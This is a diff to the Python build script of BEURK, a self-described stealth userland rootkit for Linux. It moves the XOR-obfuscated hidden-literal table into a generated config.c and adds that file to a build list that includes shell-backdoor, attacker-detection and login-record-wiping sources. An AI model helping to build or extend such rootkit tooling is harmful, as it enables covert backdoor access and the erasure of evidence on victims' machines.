@@ -188,6 +188,35 @@ HEADER = """/*
 /* common macros from beurk config file*/
 """
 
+CONFIG_C = """/*
+ * BEURK is an userland rootkit for GNU/Linux, focused around stealth.
+ * Copyright (C) 2015  unix-thrust
+ *
+ * This file is part of BEURK.
+ *
+ * BEURK is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * BEURK is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
+ */
+
+#include "config.h"
+
+ char __hidden_literals[NUM_LITERALS][MAX_LITERAL_SIZE] = {
+    %(literals)s
+};
+
+"""
+
+
 
 # add all config vars to header
 # (except for type_str and type_hidden_literal)
@@ -226,10 +255,7 @@ literals_code = """
 /* store hidden (XORed) literals */
 #define NUM_LITERALS (%(num_literals)d)
 #define MAX_LITERAL_SIZE (%(max_literal_size)d)
-static char __hidden_literals[NUM_LITERALS][MAX_LITERAL_SIZE] = {
-    %(literals)s
-};
-
+extern char __hidden_literals[NUM_LITERALS][MAX_LITERAL_SIZE];
 
 /* store real function pointers (hooks fallbacks) */
 #define NUM_HOOKS (%(num_hooks)d)
@@ -271,7 +297,6 @@ for _type, name in function_hooks:
 max_literal_size += 1
 
 HEADER += literals_code % {
-        "literals": "\n    ".join(literals),
         "max_literal_size": max_literal_size + 1,
         "num_literals": num_literals,
         "num_hooks": len(function_hooks),
@@ -279,8 +304,12 @@ HEADER += literals_code % {
         }
 
 
+CONFIG_C %= {
+        "literals": "\n    ".join(literals),
+        }
 # write HEADER into config.h
 open("includes/config.h", 'w').write(HEADER)
+open("src/config.c", "w").write(CONFIG_C)
 
 
 ###############################################################################
@@ -335,6 +364,7 @@ def run_build_command(cmd):
 
 SOURCES = [
         "src/init.c",
+        "src/config.c",
         "src/drop_shell_backdoor.c",
         "src/is_attacker.c",
         "src/cleanup_login_records.c",
